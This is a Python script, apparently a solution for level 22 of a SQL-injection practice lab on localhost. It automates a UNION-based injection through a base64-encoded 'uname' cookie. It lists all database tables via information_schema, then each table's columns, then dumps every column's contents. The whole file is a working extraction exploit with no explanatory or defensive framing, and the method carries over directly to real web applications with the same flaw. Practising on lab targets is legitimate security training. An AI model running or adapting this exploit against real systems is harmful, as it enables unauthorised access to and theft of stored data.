import requests
import base64

get_table = "(select group_concat(table_name) from information_schema.tables where table_schema= database())"
get_column = "(select group_concat(column_name) from information_schema.columns where table_name = '{0}')"
get_secret = "(select group_concat({0}) from {1})"
url = "http://localhost:1234/Less-22/"
session = requests.Session()

payload = '" union select 1,{},3#'

cookies = {"uname": base64.b64encode(
    payload.format(get_table).encode("ascii")).decode()}
response = requests.post(url, cookies=cookies)
while('Subquery returns more than 1 row' in response.text):
    response = requests.post(url, cookies=cookies)
temp = response.text[842+len(base64.b64encode(
    payload.format(get_table).encode("ascii")).decode()):-233]
tables = temp.split(',')
for i in tables:
    print("From Table", i, ": ")
    find = get_column.format(i)
    cookies = {"uname": base64.b64encode(
        payload.format(find).encode("ascii")).decode()}
    response = requests.post(url, cookies=cookies)
    while('Subquery returns more than 1 row' in response.text):
        response = requests.post(url, cookies=cookies)
    temp = response.text[842+len(base64.b64encode(
        payload.format(find).encode("ascii")).decode()):-233]
    columns = temp.split(',')
    print("Columns : ", *columns)
    for j in columns:
        print("From Column", j, ": ")
        find = get_secret.format(j, i)
        cookies = {"uname": base64.b64encode(
            payload.format(find).encode("ascii")).decode()}
        response = requests.post(url, cookies=cookies)
        while('Subquery returns more than 1 row' in response.text):
            response = requests.post(url, cookies=cookies)
        print(
            response.text[842+len(base64.b64encode(payload.format(find).encode("ascii")).decode()):-233])
